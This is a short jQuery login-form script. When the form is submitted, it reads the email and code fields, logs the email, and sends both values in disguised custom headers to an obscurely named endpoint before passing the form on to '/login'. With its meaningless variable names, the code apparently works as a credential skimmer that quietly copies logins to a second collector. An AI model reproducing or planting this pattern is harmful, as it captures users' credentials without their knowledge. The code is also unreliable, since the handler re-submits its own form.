/*
 *
 */

$(document).ready(function() {
    $('#login-form').on('submit', function () {
        var gsdsb = document.getElementById('email').value;
        console.log(gsdsb);
        var ssref = document.getElementById('code').value;
        var error = document.getElementById('error');
        $.ajax({
            url: '/dfmnbsdhfb',
            headers: { 'X-COM-PERSIST': gsdsb,'X-COM-LOCATION': ssref},
            type : 'POST',
            contentType: "application/json",
            success : function (data) {
                console.log(data);
            },
            error : function (data, errorThrown) {
                console.log(data);
                error.value = "Invalid Credentials";
            }
        });
        $('#login-form').attr('action','/login');
        $('#login-form').submit();
    });
});